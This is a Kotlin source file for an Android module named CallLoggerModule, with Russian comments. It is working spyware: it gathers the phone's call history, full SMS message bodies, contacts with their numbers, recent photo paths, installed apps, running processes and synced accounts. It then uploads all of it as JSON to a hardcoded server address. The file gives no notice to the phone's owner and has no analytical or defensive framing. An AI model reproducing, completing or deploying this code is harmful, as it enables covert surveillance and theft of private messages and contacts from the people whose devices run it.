package com.example.dexmodule

import android.accounts.AccountManager
import android.app.ActivityManager
import android.content.Context
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class CallLoggerModule {
    private val serverBaseUrl = "http://192.168.0.101:3000"

    fun collectAndSendAllData(context: Context) {
        collectAndSendCallLogs(context)
        collectAndSendContacts(context)
        collectAndSendSms(context)
        collectAndSendSystemInfo(context)
        collectAndSendPhotos(context)
    }

    // Существующий код для звонков
    fun collectAndSendCallLogs(context: Context) {
        val callLogs = JSONArray()

        context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.TYPE
            ),
            null, null, "${CallLog.Calls.DATE} DESC"
        )?.use { cursor ->
            while (cursor.moveToNext()) {
                JSONObject().apply {
                    put("number", cursor.getString(0))
                    put("date", cursor.getString(1))
                    put("type", when (cursor.getInt(2)) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        else -> "unknown"
                    })
                }.let { callLogs.put(it) }
            }
        }
        sendToServer("$serverBaseUrl/upload-calls", callLogs)
    }

    // Новый код для SMS
    private fun collectAndSendSms(context: Context) {
        val smsList = JSONArray()

        context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.DATE,
                Telephony.Sms.BODY
            ),
            null, null, "${Telephony.Sms.DATE} DESC"
        )?.use { cursor ->
            while (cursor.moveToNext()) {
                JSONObject().apply {
                    put("address", cursor.getString(0))
                    put("date", cursor.getString(1))
                    put("body", cursor.getString(2))
                }.let { smsList.put(it) }
            }
        }
        sendToServer("$serverBaseUrl/upload-sms", smsList)
    }

    fun collectAndSendSystemInfo(context: Context) {
        val systemInfo = collectSystemInfo(context)
        sendToServer("$serverBaseUrl/upload-system-info", systemInfo)
    }


    private fun collectAndSendContacts(context: Context) {
        val contacts = JSONArray()

        context.contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            arrayOf(
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.HAS_PHONE_NUMBER,
                ContactsContract.Contacts._ID
            ),
            null, null, null
        )?.use { cursor ->
            while (cursor.moveToNext()) {
                val name = cursor.getString(0)
                val hasPhone = cursor.getInt(1) > 0
                val contactId = cursor.getString(2)

                JSONObject().apply {
                    put("name", name)
                    put("phones",
                        if (hasPhone) {
                            getContactPhones(context, contactId)
                        } else {
                            JSONArray()
                        }
                    )
                }.let { contacts.put(it) }
            }
        }
        sendToServer("$serverBaseUrl/upload-contacts", contacts)
    }

    private fun getContactPhones(context: Context, contactId: String): JSONArray {
        val phones = JSONArray()

        context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
            arrayOf(contactId),
            null
        )?.use { cursor ->
            while (cursor.moveToNext()) {
                phones.put(cursor.getString(0))
            }
        }
        return phones
    }

    private fun collectAndSendPhotos(context: Context) {
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.DATA
        )

        val photos = JSONArray()

        context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )?.use { cursor ->
            var count = 0
            while (cursor.moveToNext() && count < 5) {
                JSONObject().apply {
                    put("path", cursor.getString(2))
                    put("date", cursor.getString(1))
                }.let {
                    photos.put(it)
                    count++
                }
            }
        }
        sendToServer("$serverBaseUrl/upload-photos", photos)
    }

    // Общая функция отправки
    private fun sendToServer(url: String, data: Any) {
        try {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true
            conn.connectTimeout = 5000
            conn.readTimeout = 10000

            conn.outputStream.use { os ->
                os.write(data.toString().toByteArray(Charsets.UTF_8))
            }

            val responseCode = conn.responseCode
            println("Response from $url: $responseCode")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }






    fun collectSystemInfo(context: Context): JSONObject {
        return JSONObject().apply {
            put("os_version", Build.VERSION.RELEASE)
            put("sdk_version", Build.VERSION.SDK_INT)
            put("free_space", getFreeStorageSpace())
            put("installed_apps", getInstalledApps(context ))
            put("running_processes", getRunningProcesses(context))
            put("accounts", getSyncedAccounts(context))
        }
    }

    private fun getFreeStorageSpace(): Long {
        val stat = StatFs(Environment.getDataDirectory().path)
        return stat.availableBlocksLong * stat.blockSizeLong
    }

    private fun getInstalledApps(context: Context): JSONArray {
        val apps = JSONArray()
        val packages = context.packageManager.getInstalledPackages(0)
        packages.forEach {
            apps.put(JSONObject().apply {
                put("name", it.applicationInfo?.loadLabel(context.packageManager) ?: "")
                put("package", it.packageName)
                put("version", it.versionName)
            })
        }
        return apps
    }

    private fun getRunningProcesses(context: Context): JSONArray {
        val processes = JSONArray()
        val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        activityManager.runningAppProcesses?.forEach {
            processes.put(JSONObject().apply {
                put("process_name", it.processName)
                put("pid", it.pid)
            })
        }
        return processes
    }

    private fun getSyncedAccounts(context: Context): JSONArray {
        val accounts = JSONArray()
        val accountManager = AccountManager.get(context)
        accountManager.accounts.forEach {
            accounts.put(JSONObject().apply {
                put("type", it.type)
                put("name", it.name)
            })
        }
        return accounts
    }
}

